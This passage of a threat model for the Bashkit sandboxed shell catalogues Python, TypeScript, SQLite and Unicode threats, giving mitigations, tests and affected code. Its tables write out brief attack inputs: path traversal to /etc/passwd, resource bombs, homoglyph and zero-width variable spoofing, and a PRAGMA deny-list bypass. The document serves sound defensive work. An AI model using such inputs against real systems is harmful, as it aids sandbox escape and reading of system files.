| TM-PY-027 | Unbounded recursion in JSON conversion | `py_to_json`/`json_to_py` recurse without depth limit on nested dicts/lists | `json_to_py_inner`, `py_to_json_inner`, and the MontyObject converters all carry a `depth` arg; depth > `MAX_NESTING_DEPTH = 64` raises `ValueError("… nesting depth exceeds maximum of 64")` | **MITIGATED** |
| TM-PY-030 | GIL deadlock via async-callback private loop | Private-loop dispatch blocked on a rendezvous channel while attached (GIL held), and pyclass dealloc joined in-flight blocking tasks that must re-attach to finish — either froze the whole process (observed as a 6 h CI hang) | Dispatch detaches around both the send and the receive; `PyRuntime` drop shuts the tokio runtime down with `shutdown_background()` instead of a blocking join | **MITIGATED** |

**TM-PY-026** (mitigated): `PyBash::reset` and `BashTool::reset` (`crates/bashkit-python/src/lib.rs`)
rebuild the inner `Bash` via `replace_live_bash_with_builder` + `build_live_builder`, which
re-applies the original limits, env, and registered builtins. Regression tests:
`tests/test_python_security.py::test_bash_reset_preserves_limits`,
`…test_bashtool_reset_preserves_limits`.

**TM-PY-027** (mitigated): `json_to_py_inner`, `py_to_json_inner`, and the corresponding
MontyObject converters in `crates/bashkit-python/src/lib.rs` carry a `depth: usize` argument.
At `depth > MAX_NESTING_DEPTH = 64`, conversion raises a Python `ValueError` instead of
recursing. Coverage: `tests/_security_advanced.py::JsonConversionBoundariesTests`.

**TM-PY-030** (mitigated): two deadlock variants in the async-callback private-loop
machinery (`crates/bashkit-python/src/lib.rs`). (1) `PyPrivateAsyncLoop::run_awaitable`
sent work to the dedicated worker thread over a `sync_channel(0)` rendezvous while
attached; on first use the worker must attach (acquire the GIL) to create its asyncio
loop before it can `recv()`, so dispatcher and worker waited on each other. The send
and receive now both run inside `py.detach(...)`. (2) Pyclass dealloc runs attached
and dropped the last `Arc<Runtime>`; tokio's default `Runtime::drop` joins in-flight
blocking tasks, and an abandoned (timed-out) callback task must re-attach to finish —
freezing the entire interpreter. The `PyRuntime` handle now shuts the runtime down
with `shutdown_background()` on last drop. Regression tests:
`tests/test_async_callbacks.py::test_async_callback_execute_sync_honors_timeout`,
`…::test_dealloc_during_inflight_callback_does_not_deadlock`.

| TM-PY-029 | Host clock information disclosure | `datetime.date.today()` / `datetime.datetime.now()` expose host system time and timezone | Intentional — required for correct datetime semantics | **ACCEPTED** |

**TM-PY-029**: `crates/bashkit/src/builtins/python.rs` — `handle_date_today()` and
`handle_datetime_now()` read the host system clock via `chrono::Local::now()` /
`chrono::Utc::now()`. This exposes the host's current time and timezone offset to
sandboxed Python code. Accepted as intentional: datetime operations require real time,
and this information has low sensitivity. No filesystem or network access is granted.

### VFS Bridge Security Properties

1. **No real filesystem access**: All Path and open operations go through Bashkit's VFS.
   `/etc/passwd` in Python reads from VFS, not the host.
2. **Shared VFS with bash**: Files written by `echo > file` are readable by
   Python's `open(file).read()` / `Path(file).read_text()`, and vice versa.
   This is intentional.
3. **Path resolution**: Relative paths are resolved against the shell's cwd.
   Path traversal (`../..`) is constrained by VFS path normalization.
4. **Error mapping**: VFS errors are mapped to standard Python exceptions
   (FileNotFoundError, IsADirectoryError, etc.), not raw panics.
5. **Resource isolation**: Monty's own limits (time, memory, allocations,
   recursion) are enforced independently of Bashkit's shell limits.

### Direct Integration

Monty runs directly in the host process. Resource limits (memory, allocations,
time, recursion) are enforced by Monty's own runtime, not by process isolation.
All VFS operations are bridged in-process — Python code never touches the real
filesystem.

### Supported OsCall Operations

| Operation | VFS Method | Return Type |
|-----------|-----------|-------------|
| Path.exists() | fs.exists() | bool |
| Path.is_file() | fs.stat() | bool |
| Path.is_dir() | fs.stat() | bool |
| Path.is_symlink() | fs.stat() | bool |
| open(), Path.open() | fs.stat() / fs.write_file() | file handle |
| Path.read_text() | fs.read_file() | str |
| Path.read_bytes() | fs.read_file() | bytes |
| Path.write_text() | fs.write_file() | int |
| Path.write_bytes() | fs.write_file() | int |
| file.write() append mode | fs.read_file() + fs.write_file() | int |
| Path.mkdir() | fs.mkdir() | None |
| Path.unlink() | fs.remove() | None |
| Path.rmdir() | fs.remove() | None |
| Path.iterdir() | fs.read_dir() | list[Path] |
| Path.stat() | fs.stat() | stat_result |
| Path.rename() | fs.rename() | Path |
| Path.resolve() | identity (no symlink resolution) | Path |
| Path.absolute() | identity (no symlink resolution) | Path |
| os.getenv() | ctx.env lookup | str/None |
| os.environ | ctx.env dict | dict |

---

## TypeScript / ZapCode Security (TM-TS)

> **Experimental.** ZapCode is an early-stage TypeScript interpreter that may
> have undiscovered crash or security bugs. Resource limits are enforced by
> ZapCode's VM. This integration should be treated as experimental.
>
> **Opt-in only.** TypeScript builtins (ts, node, deno, bun) are NOT registered
> by default. They require both the `typescript` Cargo feature flag AND an
> explicit `.typescript()` call on the builder. Without both, these commands
> are unavailable.

Bashkit embeds the ZapCode TypeScript interpreter (zapcode-core) with VFS
bridging via external function suspend/resume. TypeScript code can access the
virtual filesystem through registered external functions. This section covers
threats specific to the TypeScript builtin.

### Architecture

```
TypeScript code → ZapCode VM → ExternalFn suspend → Bashkit VFS bridge → resume
```

ZapCode never touches the real filesystem. External function calls suspend the
VM, Bashkit intercepts and dispatches to the VFS, then resumes execution.

### Opt-in Design

TypeScript execution requires **two explicit opt-in steps**:

1. **Cargo feature flag**: `features = ["typescript"]` — compiles zapcode-core
2. **Builder registration**: `.typescript()` — registers ts/node/deno/bun commands

Without step 1, the dependency is not compiled. Without step 2, the commands
are not available even if compiled. This matches the Python builtin pattern.

### Threats

| ID | Threat | Severity | Mitigation | Test |
|----|--------|----------|------------|------|
| TM-TS-001 | Infinite loop via `while (true) {}` | High | ZapCode time limit (default 30s) | `threat_ts_infinite_loop` |
| TM-TS-002 | Memory exhaustion via large allocation | High | ZapCode max_memory (64MB) + max_allocations (1M) | `threat_ts_memory_exhaustion` |
| TM-TS-003 | Stack overflow via deep recursion | High | ZapCode max_stack_depth (512) | `threat_ts_stack_overflow` |
| TM-TS-004 | Allocation bomb (many small objects) | High | ZapCode max_allocations (1M) | `threat_ts_allocation_bomb` |
| TM-TS-005 | Real filesystem access via VFS | Critical | VFS bridge reads only from Bashkit VFS, not host | `threat_ts_vfs_no_real_fs` |
| TM-TS-006 | VFS write escapes to host | Critical | VFS bridge writes only to Bashkit VFS | `threat_ts_vfs_write_sandboxed` |
| TM-TS-007 | Path traversal (../../etc/passwd) | High | VFS resolves paths within sandbox boundaries | `threat_ts_vfs_path_traversal` |
| TM-TS-008 | Bash/TypeScript VFS data corruption | Medium | Shared VFS by design; no cross-tenant access | `threat_ts_vfs_bash_ts_shared` |
| TM-TS-009 | Crash on missing file | Medium | Error string returned, not panic | `threat_ts_vfs_error_handling` |
| TM-TS-010 | VFS mkdir escape | Medium | mkdir operates only in VFS | `threat_ts_vfs_mkdir_sandboxed` |
| TM-TS-011 | VFS operations escape to host /tmp | Critical | All operations go through Bashkit VFS | `threat_ts_vfs_no_host_escape` |
| TM-TS-012 | Error info leakage via stdout | Medium | Errors go to stderr, not stdout | `threat_ts_error_isolation` |
| TM-TS-013 | Syntax error crashes host | Medium | Non-zero exit code, error on stderr | `threat_ts_syntax_error_exit` |
| TM-TS-014 | Exit code not propagated | Low | Exit code flows to bash $? | `threat_ts_exit_code_propagation` |
| TM-TS-015 | Empty code crashes | Low | Non-zero exit, error message | `threat_ts_empty_code` |
| TM-TS-016 | Pipeline error leakage | Medium | Errors on stderr, not passed to pipe | `threat_ts_pipeline_error_handling` |
| TM-TS-017 | Unknown options accepted | Low | Unknown flags return non-zero | `threat_ts_unknown_options` |
| TM-TS-018 | TypeScript bypasses Bashkit limits | Medium | Command budget still enforced | `threat_ts_respects_bash_limits` |
| TM-TS-019 | Command subst captures errors | Medium | Only stdout captured by $() | `threat_ts_subst_captures_stdout` |
| TM-TS-020 | Bash var expansion injection | Medium | By-design; use single quotes to prevent | `threat_ts_variable_expansion` |
| TM-TS-021 | Shell command execution from TS | Critical | No process/subprocess/exec globals | `threat_ts_no_shell_exec` |
| TM-TS-022 | Script reads from host filesystem | Critical | Script file loaded via VFS | `threat_ts_script_from_vfs` |
| TM-TS-023 | Shebang line injection | Low | Shebang stripped safely | `threat_ts_shebang_stripped` |

### Blocked Language Features

ZapCode blocks these at the language level (not just runtime):

| Feature | Status | Rationale |
|---------|--------|-----------|
| `eval()` | Blocked | Dynamic code execution escape |
| `Function()` constructor | Blocked | Dynamic code generation |
| `import` / `require` | Blocked | Module system not implemented |
| `process` global | Blocked | No Node.js process API |
| `Deno` global | Blocked | No Deno runtime API |
| `Bun` global | Blocked | No Bun runtime API |
| `globalThis.process` | Blocked | No runtime globals |
| `__proto__` mutation | Blocked | Prototype pollution prevention |

### VFS Bridge Security Properties

1. **No real filesystem access**: All VFS-bridged functions go through Bashkit's
   VFS. `/etc/passwd` in TypeScript reads from VFS, not the host.
2. **Shared VFS with bash**: Files written by `echo > file` are readable by
   TypeScript's `readFile()`, and vice versa. This is intentional.
3. **Path resolution**: Relative paths are resolved against the shell's cwd.
   Path traversal (`../..`) is constrained by VFS path normalization.
4. **Error handling**: VFS errors return error strings to TypeScript, not panics.
5. **Resource isolation**: ZapCode's own limits (time, memory, stack, allocations)
   are enforced independently of Bashkit's shell limits.

### Supported VFS Operations

| Operation | External Function | Return Type |
|-----------|------------------|-------------|
| Read file | readFile(path) | string |
| Write file | writeFile(path, content) | undefined |
| Check existence | exists(path) | boolean |
| List directory | readDir(path) | string[] |
| Create directory | mkdir(path) | undefined |
| Delete file/dir | remove(path) | undefined |
| File metadata | stat(path) | JSON string |

### Known Limitation

`ZapcodeSnapshot::resume()` does not expose the VM's accumulated stdout.
This means `console.log()` output produced *after* a VFS call (external
function) is not captured. Use the return-value pattern instead — the last
expression's value is printed. This is a `zapcode-core` API limitation.

---

## SQLite Security (TM-SQL)

> **Experimental and opt-in for now.** The `sqlite`/`sqlite3` builtins embed
> Turso's pure-Rust SQLite-compatible engine. Library callers must compile
> the `sqlite` feature, register the builtin with `.sqlite()` or
> `.sqlite_with_limits(...)`, and set `BASHKIT_ALLOW_INPROCESS_SQLITE=1`
> before SQL executes. Without the runtime opt-in, registered commands fail
> closed with a disabled error.

Bashkit runs SQLite in-process against databases stored in the virtual
filesystem or `:memory:`. The default backend loads and flushes whole database
files through the VFS; the VFS backend implements Turso's `IO` trait over
`Arc<dyn FileSystem>`. Neither backend intentionally touches the host
filesystem.

### Threats

| ID | Threat | Severity | Mitigation | Test |
|----|--------|----------|------------|------|
| TM-SQL-001 | Code execution via BETA upstream | Critical | Cargo feature + builder registration + runtime opt-in gate | `tm_sql_001_default_disabled_without_opt_in` |
| TM-SQL-002 | Sandbox escape via host filesystem | Critical | DB files, `.read`, and VFS backend paths resolve through `Arc<dyn FileSystem>` | `tm_sql_002_paths_resolve_only_to_vfs`, `tm_sql_002b_vfs_backend_isolated_to_bash_fs` |
| TM-SQL-003 | DoS via large SQL input | High | `SqliteLimits::max_script_bytes` | `tm_sql_003_oversize_script_rejected` |
| TM-SQL-004 | DoS via huge result set | High | `SqliteLimits::max_rows_per_query`, enforced before materialising each row | `tm_sql_004_oversize_result_set_aborts` |
| TM-SQL-005 | DoS via huge DB file | High | `SqliteLimits::max_db_bytes` on load and while growing DBs on both backends | `tm_sql_005_oversize_db_file_rejected`, `db_growth_beyond_max_rejected_on_both_backends` |
| TM-SQL-005a | DoS via wall-clock burn | High | Per-step deadline and `Statement::interrupt()` | `deadline_already_expired_aborts_with_timeout` |
| TM-SQL-005b | DoS via statement flood | Medium | `SqliteLimits::max_statements` after splitting | `too_many_statements_rejected` |
| TM-SQL-006 | Binary truncation in BLOB round-trip | Medium | Values backed by `Vec<u8>` | `tm_sql_006_null_bytes_in_text_safely_round_trip` |
| TM-SQL-007 | CSV escape failure with separator-bearing blobs | Medium | RFC-4180 quoting | `tm_sql_007_blob_with_separator_quoted_in_csv` |
| TM-SQL-008 | Stack overflow via recursive `.read` | High | `MAX_DOT_READ_DEPTH` hard cap | `tm_sql_008_recursive_dot_read_eventually_terminates` |
| TM-SQL-009 | Cross-database access via `ATTACH`/`DETACH` | High | Case/comment-aware policy rejection | `tm_sql_009_attach_detach_rejected`, `attach_blocked_even_with_leading_comment` |
| TM-SQL-010 | DoS or fingerprinting via dangerous PRAGMAs | High | `SqliteLimits::pragma_deny` default deny list; policy parser handles comments plus quoted/schema-qualified names | `tm_sql_010_pragma_deny_blocks_resource_knobs`, `pragma_schema_qualified_match` |
| TM-SQL-011 | Host-side error string disclosure | Medium | `sanitize()` strips host path annotations from Turso errors | Manual exploratory review |

### Test Shape

SQLite coverage intentionally mixes black-box and white-box checks:

- **Black-box**: `tests/sqlite_integration_tests.rs` and
  `tests/sqlite_security_tests.rs` drive `Bash::exec`, shell parsing,
  redirection, pipelines, the `sqlite3` alias, opt-in failure, VFS
  persistence, and policy errors through the public API.
- **White-box**: `builtins/sqlite/tests.rs` exercises parser splitting,
  SQL policy sniffing, sanitizer behavior, backend equivalence, formatter
  modes, resource limits, and dot-command recursion directly inside the
  module.
- **Differential/fuzz**: `tests/sqlite_differential_tests.rs`,
  `tests/sqlite_compat_tests.rs`, and `tests/sqlite_fuzz_tests.rs` compare
  against host `sqlite3` where available and assert no-panic/no-leak
  invariants for generated inputs.

Exploratory probing found and fixed two gaps in this section: quoted
schema-qualified PRAGMAs such as `PRAGMA main."cache_size"` bypassed the deny
list, and the VFS backend used the default 256 MiB cap instead of the caller's
custom `max_db_bytes` while allowing growth past the cap.

---

## Unicode Security (TM-UNI)

Unicode handling presents a broad attack surface in any interpreter that processes
untrusted text input. Bashkit processes Unicode in script source, variable values,
filenames, and builtin arguments (awk/sed/grep patterns). This section catalogs
Unicode-specific threats beyond the path-level protections in TM-DOS-015.

**Context**: AI agents (Bashkit's primary users) frequently generate Unicode content —
LLMs produce box-drawing characters, emoji, CJK, accented text, and other multi-byte
sequences in comments, strings, and data. Issue #395 demonstrated that the awk parser
panics on multi-byte Unicode because it conflates character positions with byte offsets.

### 11.1 Builtin Parser Byte-Boundary Safety

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-UNI-001 | Byte-boundary panic in awk | `awk '{print}' <<< "─ comment"` — multi-byte char causes `self.input[self.pos..]` panic | `catch_unwind` (TM-INT-001) catches the panic; root fix requires char-boundary-safe indexing | **PARTIAL** |
| TM-UNI-002 | Byte-boundary panic in sed | `sed 's/─/x/' file` — similar byte-offset slicing | `catch_unwind` catches; needs audit of `&s[start..i]` patterns | **PARTIAL** |
| TM-UNI-015 | Byte-boundary panic in expr | `expr substr "café" 4 1` — char position used as byte index in string slice | `catch_unwind` catches; `.len()` returns bytes but used as char count | **PARTIAL** |
| TM-UNI-016 | Byte-boundary panic in printf | `printf "%.1s" "é"` — precision truncation slices mid-character | `catch_unwind` catches; `&s[..prec]` without boundary check | **PARTIAL** |
| TM-UNI-017 | Byte-level char set in cut/tr | `echo "café" \| tr 'é' 'x'` — `as_bytes()` iteration drops multi-byte chars | `catch_unwind` catches; `.find()` byte offsets mixed with string slicing | **PARTIAL** |
| TM-UNI-018 | Byte/char confusion in arithmetic | `((α=1))` — `find('=')` byte offset used as char index in `.chars().nth()` | Wrong character inspection; no panic but incorrect operator detection | **PARTIAL** |
| TM-UNI-019 | Byte/char confusion in URL matching | Allowlist path with multi-byte chars — `pattern_path.len()` bytes used as char index | Wrong path boundary check; no panic but incorrect allow/deny decision | **PARTIAL** |

**Current Risk**: MEDIUM — `catch_unwind` (TM-INT-001) prevents process crash for all
builtins, but they silently fail instead of processing the input correctly. Scripts get
unexpected "builtin failed unexpectedly" errors on valid Unicode input. Interpreter-level
issues (TM-UNI-018) produce wrong results without panic. Network allowlist issues
(TM-UNI-019) may produce incorrect allow/deny decisions on multi-byte URL paths.

**Root Cause**: A pervasive pattern across multiple components: code uses `.find()`,
`.len()`, or manual counters that return **byte offsets** but then passes these values
to APIs expecting **character indices** (`.chars().nth()`) or uses them where char-based
counting is needed. For ASCII this is coincidentally correct. For multi-byte UTF-8 (2–4
bytes per char), character position N does not equal byte offset N.

**Affected Code**:

*awk.rs (50+ instances — CRITICAL):*
```
Line 449:  self.input[start..self.pos].to_string()     // read_identifier
Line 453:  self.input[self.pos..].starts_with(keyword)  // matches_keyword
Line 1532: self.input[start..self.pos].to_string()      // parse_primary
Line 1596: self.input[start..self.pos]                   // parse_number
Lines 397-1564: 69 instances of .chars().nth(pos) where pos is byte offset
Lines 1006-1430: ~10 operator checks using self.input[self.pos..]
```

*sed.rs (14 instances):*
```
Lines 293-299: split_sed_commands() — chars().enumerate() index as byte offset
Lines 376-382: parse_address() — byte offset arithmetic
Lines 455, 458: parse_sed_command() — .nth(1) + [2..] assumes single-byte
Lines 547-566: commands a/i/c — .len() > 1 checked but .chars().nth(1) may fail
Lines 574-609: rest[1..] assumes single-byte first char
```

*expr.rs (3 instances):*
```
Line 46:  args[1].len() — returns bytes, used as character count for `length`
Line 57:  pos > s.len() — byte length used as character position bound
Line 62:  s[start..end] — char positions (1-based user input) used as byte indices
```

*printf.rs (1 instance):*
```
Line 165: &s[..s.len().min(prec)] — prec may land mid-character
```

*cuttr.rs (expand_char_set):*
```
Lines 405-410: as_bytes() iteration — all non-ASCII chars treated as individual bytes
Line 410: spec[i + 2..].find(":]") byte offset mixed with byte-based slicing (safe for ASCII class names but fragile)
```

*interpreter/mod.rs:*
```
Lines 1520, 1524: expr.chars().nth(eq_pos ± 1) where eq_pos from .find('=') is byte offset
```

*network/allowlist.rs:*
```
Line 194: url_path.chars().nth(pattern_path.len()) — byte count used as char index
```

**Fix Pattern**: Convert all byte/char-confused code to use one of:
1. `char_indices()` iteration — returns `(byte_offset, char)` pairs
2. `is_char_boundary()` checks before slicing
3. Consistent byte-only offsets from `.find()` for slicing

The `logging_impl.rs:truncate()` function demonstrates the correct pattern using
`is_char_boundary()`.

### 11.2 Zero-Width Character Injection

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-UNI-003 | Zero-width chars in filenames | `touch "/tmp/file\u{200B}name"` — invisible ZWSP creates confusable filenames | `find_unsafe_path_char()` rejects U+200B-U+200D, U+2060, U+FEFF, U+180E in path components | **MITIGATED** |
| TM-UNI-004 | Zero-width chars in variable names | `\u{200B}PATH=malicious` — invisible char makes variable look like PATH | Not detected; Bash itself allows this | **ACCEPTED** |
| TM-UNI-005 | Zero-width chars in script source | `echo "pass\u{200B}word"` — invisible char in string literal | Not detected; pass-through is correct Bash behavior | **ACCEPTED** |

**Current Risk**: LOW for filenames (path validation gap), MINIMAL for variables/scripts
(correct pass-through behavior matches Bash)

**Zero-width characters of concern**:
- U+200B Zero Width Space (ZWSP)
- U+200C Zero Width Non-Joiner (ZWNJ)
- U+200D Zero Width Joiner (ZWJ)
- U+FEFF Byte Order Mark / Zero Width No-Break Space
- U+2060 Word Joiner
- U+180E Mongolian Vowel Separator

**Status**: TM-UNI-003 is **MITIGATED**. `find_unsafe_path_char()` (`crates/bashkit/src/fs/limits.rs`)
rejects U+200B-U+200D, U+2060, U+FEFF, and U+180E in path components. Variable names and
script content still pass through as-is to match Bash behavior (TM-UNI-004, TM-UNI-005).

### 11.3 Homoglyph / Confusable Characters

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-UNI-006 | Homoglyph filename confusion | `/tmp/tеst.sh` (Cyrillic е U+0435 vs Latin e U+0065) — visually identical filenames with different content | Not detected; full homoglyph detection is impractical | **ACCEPTED** |
| TM-UNI-007 | Homoglyph variable confusion | `pаth=/evil` (Cyrillic а) vs `path=/safe` (Latin a) | Not detected; matches Bash behavior | **ACCEPTED** |

**Current Risk**: LOW — Bashkit runs untrusted scripts in isolation. Homoglyph confusion
primarily threatens humans reading code, not automated execution. Full Unicode confusable
detection (UTS #39) would require large lookup tables and produce false positives on
legitimate CJK/accented text.

**Decision**: Accept risk. Document that callers displaying filenames or variable names
to users should apply their own confusable-character detection if needed.

### 11.4 Unicode Normalization

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-UNI-008 | Normalization-based filename bypass | NFC "café" vs NFD "café" (composed é vs e+combining acute) create two distinct files with the same visual name | No normalization applied; matches real filesystem behavior | **ACCEPTED** |

**Current Risk**: LOW — This matches POSIX/Linux filesystem behavior (filenames are opaque
byte sequences). macOS normalizes to NFD, Linux does not. Bashkit's VFS treats filenames
as byte-exact strings, consistent with Linux behavior.

**Decision**: Accept risk. Normalization would break round-trip fidelity and is not done by
real Bash on Linux.

### 11.5 Combining Character Abuse

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-UNI-009 | Excessive combining marks | Filename with 1000 combining diacritical marks on one base char — visual DoS / potential rendering hang | `max_filename_length` (255 bytes) limits total size | **MITIGATED** |
| TM-UNI-010 | Combining marks in builtin input | `awk` / `grep` pattern with excessive combiners | Execution timeout + builtin parser depth limit | **MITIGATED** |

**Current Risk**: LOW — Existing length limits bound the damage.

### 11.6 Tag Characters and Other Invisibles

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-UNI-011 | Tag character hiding | U+E0001-U+E007F (Tags block) — invisible chars that can conceal content in filenames | `find_unsafe_path_char()` rejects U+E0000-U+E007F in path components | **MITIGATED** |
| TM-UNI-012 | Interlinear annotation hiding | U+FFF9-U+FFFB (Interlinear Annotations) — can hide text in filenames | `find_unsafe_path_char()` rejects U+FFF9-U+FFFB in path components | **MITIGATED** |
| TM-UNI-013 | Deprecated format chars | U+206A-U+206F (Deprecated formatting) — can cause display confusion | `find_unsafe_path_char()` rejects U+206A-U+206F in path components | **MITIGATED** |

**Status**: All three are **MITIGATED**. `find_unsafe_path_char()` rejects every
documented invisible/confusable range in path components:
- U+200B-U+200D, U+2060, U+FEFF, U+180E (zero-width, TM-UNI-003)
- U+202A-U+202E, U+2066-U+2069 (bidi overrides, TM-DOS-015)
- U+206A-U+206F (deprecated format, TM-UNI-013)
- U+FFF9-U+FFFB (interlinear annotations, TM-UNI-012)
- U+E0000-U+E007F (tag block, TM-UNI-011)

Variable names, script content, and command output are unaffected — pass-through there
matches Bash behavior. Caller-side display sanitization (see Caller Responsibilities)
remains useful defense-in-depth.

### 11.7 Bidi in Script Source

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-UNI-014 | Bidi override in script source | [Trojan Source](https://trojansource.codes/) — RTL overrides in script comments/strings reorder displayed code, hiding malicious logic | Not detected in script input; paths are protected (TM-DOS-015) | **ACCEPTED** |

**Current Risk**: LOW — Bashkit executes untrusted scripts by design. The Trojan Source
attack targets human code reviewers, not automated execution. Scripts are treated as
untrusted regardless of visual appearance.

**Decision**: Accept risk. Bidi detection in script source would be defense-in-depth for
callers who display scripts to users, but is out of scope for Bashkit's core execution
model. Document as caller responsibility.

### 11.8 Additional Builtin and Component Byte-Boundary Issues

Codebase-wide audit (beyond awk/sed covered in 11.1) found byte/char confusion in
5 additional components. All share the same root cause: using byte offsets where
character indices are expected, or vice versa.

| ID | Component | Attack Vector | Root Cause | Status |
|----|-----------|--------------|------------|--------|
| TM-UNI-015 | `expr` builtin | `expr substr "café" 4 1` — user-provided char positions used as byte indices; `expr length "café"` returns 5 (bytes) not 4 (chars) | `s[start..end]` with char-position args; `.len()` returns bytes | **PARTIAL** |
| TM-UNI-016 | `printf` builtin | `printf "%.1s" "é"` — precision 1 slices at byte 1, mid-char | `&s[..s.len().min(prec)]` without `is_char_boundary()` | **PARTIAL** |
| TM-UNI-017 | `cut`/`tr` builtins | `echo "café" \| tr 'é' 'x'` — multi-byte chars in char set specs broken | `as_bytes()` iteration in `expand_char_set()` treats all input as single-byte | **PARTIAL** |
| TM-UNI-018 | Interpreter arithmetic | `((αβγ=1))` — `find('=')` byte offset passed to `.chars().nth()` | Byte offset from `.find()` used as char index; wrong char inspected | **PARTIAL** |
| TM-UNI-019 | Network allowlist | `allow("https://example.com/données/")` — byte length as char index | `pattern_path.len()` (bytes) → `url_path.chars().nth(bytes)` | **PARTIAL** |

**Affected Code (expr.rs)**:
```
Line 46:  args[1].len().to_string()      // bytes, not char count
Line 57:  pos > s.len()                   // byte length as char position bound
Line 62:  s[start..end].to_string()       // char positions used as byte indices → PANIC
```

**Affected Code (printf.rs)**:
```
Line 165: &s[..s.len().min(prec)]         // prec may land mid-char → PANIC
```

**Affected Code (cuttr.rs)**:
```
Lines 405-410: as_bytes() iteration        // multi-byte chars split into individual bytes
Line 410: spec[i + 2..].find(":]")         // byte offset (safe for ASCII class names)
```

**Affected Code (interpreter/mod.rs)**:
```
Line 1517: expr.find('=')                  // returns byte offset
Line 1520: expr.chars().nth(eq_pos - 1)    // byte offset treated as char index
Line 1524: expr.chars().nth(eq_pos + 1)    // same confusion
```

**Affected Code (network/allowlist.rs)**:
```
Line 194: url_path.chars().nth(pattern_path.len())  // byte count as char index
```

**Risk Assessment**: MEDIUM for expr/printf (panic risk on valid input, caught by
`catch_unwind`). LOW-MEDIUM for allowlist (incorrect allow/deny on multi-byte URL paths,
no panic). LOW for interpreter arithmetic and cut/tr (multi-byte variable names and tr
specs are rare in practice).

**Safe Components** (confirmed by audit):
- **Lexer** (`parser/lexer.rs`): Uses `Chars` iterator; `Position::advance()` correctly
  uses `ch.len_utf8()` for byte offset tracking
- **wc** (`builtins/wc.rs`): Correctly uses `.len()` for bytes and `.chars().count()`
  for characters
- **grep** (`builtins/grep.rs`): Delegates to regex crate which handles Unicode correctly
- **jq** (`builtins/jq/`): Delegates to jaq crate
- **sort/uniq** (`builtins/sort_uniq.rs`): String comparison-based, no byte indexing
- **logging** (`logging_impl.rs`): Uses `is_char_boundary()` correctly
- **python** (`builtins/python.rs`): Shebang strip uses `find('\n')` — newline is ASCII,
  byte offset safe. No other byte/char manipulation.
- **Python bindings** (`bashkit-python/src/lib.rs`): PyO3 `String` extraction handles
  UTF-8 correctly. No manual byte/char manipulation patterns.
- **eval harness** (`bashkit-eval/src/`): Only uses `Iterator::find` (not `str::find`),
  `chars().take()` for display truncation, `from_utf8_lossy()` for file content. All safe.
- **curl** (`builtins/curl.rs`): All `.find()` calls use ASCII delimiters (`:`, `=`).
  Byte offsets are safe because delimiters are single-byte.
- **bc** (`builtins/bc.rs`): `find('=')` with ASCII delimiter. Safe.
- **export** (`builtins/export.rs`): `find('=')` with ASCII delimiter. Safe.
- **date** (`builtins/date.rs`): `&fmt[1..]` strips ASCII `+`. Safe.
- **comm** (`builtins/comm.rs`): `arg[1..]` strips ASCII `-`. Safe.
- **echo** (`builtins/echo.rs`): `arg_str[1..]` strips ASCII `-`. Safe.
- **archive** (`builtins/archive.rs`): `arg[1..]` strips ASCII `-`. Safe.
- **base64** (`builtins/base64.rs`): `s[7..]` after `starts_with("--wrap=")` — 7 ASCII bytes. Safe.
- **scripted_tool** (`scripted_tool/`): No byte/char patterns found.

### Unicode Security Summary

| ID | Threat | Risk | Status | Action |
|----|--------|------|--------|--------|
| TM-UNI-001 | Awk parser byte-boundary panic | MEDIUM | PARTIAL | Fix awk parser indexing (issue #395) |
| TM-UNI-002 | Sed parser byte-boundary panic | MEDIUM | PARTIAL | Fix sed byte-indexing patterns |
| TM-UNI-003 | Zero-width chars in filenames | LOW | MITIGATED | `find_unsafe_path_char()` rejects U+200B-U+200D, U+2060, U+FEFF, U+180E |
| TM-UNI-004 | Zero-width chars in variables | MINIMAL | ACCEPTED | Matches Bash behavior |
| TM-UNI-005 | Zero-width chars in scripts | MINIMAL | ACCEPTED | Correct pass-through |
| TM-UNI-006 | Homoglyph filenames | LOW | ACCEPTED | Impractical to fully detect |
| TM-UNI-007 | Homoglyph variables | LOW | ACCEPTED | Matches Bash behavior |
| TM-UNI-008 | Normalization bypass | LOW | ACCEPTED | Matches Linux FS behavior |
| TM-UNI-009 | Excessive combining marks (filenames) | LOW | MITIGATED | Length limits bound damage |
| TM-UNI-010 | Excessive combining marks (builtins) | LOW | MITIGATED | Timeout + depth limits |
| TM-UNI-011 | Tag character hiding | LOW | MITIGATED | `find_unsafe_path_char()` rejects U+E0000-U+E007F |
| TM-UNI-012 | Interlinear annotation hiding | LOW | MITIGATED | `find_unsafe_path_char()` rejects U+FFF9-U+FFFB |
| TM-UNI-013 | Deprecated format chars | LOW | MITIGATED | `find_unsafe_path_char()` rejects U+206A-U+206F |
| TM-UNI-014 | Bidi in script source | LOW | ACCEPTED | Caller responsibility |
| TM-UNI-015 | Expr substr byte-boundary panic | MEDIUM | PARTIAL | Fix expr to use char-safe indexing (issue #434) |
| TM-UNI-016 | Printf precision mid-char panic | MEDIUM | PARTIAL | Use `is_char_boundary()` (issue #435) |
| TM-UNI-017 | Cut/tr byte-level char set parsing | MEDIUM | PARTIAL | Switch to char-aware iteration (issue #436) |
| TM-UNI-018 | Interpreter arithmetic byte/char confusion | LOW | PARTIAL | Use `char_indices()` in arithmetic (issue #437) |
| TM-UNI-019 | Network allowlist byte/char confusion | MEDIUM | PARTIAL | Fix URL path matching to use byte offsets (issue #438) |

### Caller Responsibilities (Unicode)

| Responsibility | Related Threats | Description |
|---------------|-----------------|-------------|
| Sanitize displayed filenames | TM-UNI-003, TM-UNI-006, TM-UNI-011 | Strip zero-width/invisible chars before showing filenames to users |
| Homoglyph detection | TM-UNI-006, TM-UNI-007 | Apply UTS #39 confusable detection if showing script content to users |
| Bidi sanitization | TM-UNI-014 | Strip bidi overrides from script source before displaying to code reviewers |
| Validate multi-byte builtin args | TM-UNI-015, TM-UNI-016, TM-UNI-017 | Be aware that expr/printf/cut/tr may fail on non-ASCII input until byte-boundary fixes land |
| Use ASCII in network allowlist patterns | TM-UNI-019 | Avoid multi-byte chars in allowlist URL patterns until byte/char fix lands |

---

## References

- `specs/architecture.md` - System design
